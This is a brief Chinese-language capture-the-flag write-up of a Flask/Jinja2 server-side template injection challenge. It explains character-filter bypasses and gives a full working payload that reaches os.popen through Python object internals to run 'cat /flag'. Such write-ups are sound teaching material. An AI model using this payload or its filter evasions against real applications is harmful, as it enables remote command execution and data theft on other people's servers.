# ezssti

## 考点

python flask的ssti漏洞

## 学习链接

在/hint页面中也给出了，并且介绍的非常详细

https://tttang.com/archive/1698

## 题解

由于过滤了部分内容，所以使用如下的代替：

- 使用`\x5f`代替下划线
- 使用`{% %}`代替`{{}}`
- 使用`[]`代替`.`
- 使用字符串拼接绕过特定字符

最终的思路就是获取`<class 'os._wrap_close'>`然后获取`__init__`中的`__globals__`中的各种os函数

这里使用了`popen`然后将返回值`read`

使用字符串拼接绕过`cat /flag`的限制


```html
?name={% print ''['\x5f\x5fclass\x5f\x5f']['\x5f\x5fmro\x5f\x5f'][-1]['\x5f\x5fsubclasses\x5f\x5f']()[133]['\x5f\x5finit\x5f\x5f']['\x5f\x5fglobals\x5f\x5f']['popen']('ca''t /fla''g')['read']() %}
```